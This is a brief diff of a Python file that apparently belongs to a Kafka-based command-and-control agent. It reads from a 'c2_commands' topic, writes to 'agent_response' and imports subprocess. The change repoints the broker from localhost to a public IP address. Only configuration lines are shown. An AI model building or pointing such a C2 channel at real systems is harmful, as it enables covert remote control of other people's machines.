@@ -2,7 +2,7 @@ import threading
 from kafka import KafkaConsumer, KafkaProducer
 import subprocess
 
-KAFKA_BROKER = 'localhost:9092'
+KAFKA_BROKER = '34.131.235.21:9092'
 KAFKA_TOPIC_AS_PRODUCER = 'agent_response'
 KAFKA_TOPIC_AS_CONSUMER = 'c2_commands'
 
